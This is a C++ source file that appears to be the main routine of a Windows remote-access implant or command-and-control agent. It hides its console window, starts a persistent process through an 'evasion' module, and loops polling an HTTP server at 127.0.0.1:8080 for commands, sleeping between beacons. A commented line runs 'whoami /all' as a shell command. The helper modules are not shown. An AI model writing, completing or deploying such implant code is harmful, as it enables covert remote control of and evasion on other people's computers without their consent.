#include <iostream>
#include "core.h"
#include "windows.h"
#include "evasion.h"
#include "HttpCommunicator.h"

#define BUFSIZE 4096

int main(int argc, char* argv[]) {
	core c;

	// test cmd execution
	// [DONE] we need to update the process functions to redirect everything from STDOUT to a pipe (anon or named - TBD) - see this: https://stackoverflow.com/questions/42402673/createprocess-and-capture-stdout @teodor

	HttpCommunicator httpCommunicator("127.0.0.1", 8080);

	//c.execute_command("shell whoami /all");

	// Hide windows - Show only in debug
	if (true) {
		HWND windowH = GetConsoleWindow();
		ShowWindow(windowH, SW_HIDE);
	}

	core::persistent_process = evasion::create_persistent_process();
	
	// Wait for commands
	for (;;)
	{
		httpCommunicator.get_commands();

		core::read_pipe_once(core::persistent_process->stdOut);

		if (core::terminated)
			break;

		// Sleep for 50*1000ms
		Sleep(core::sleepTime * 1000);
	}
}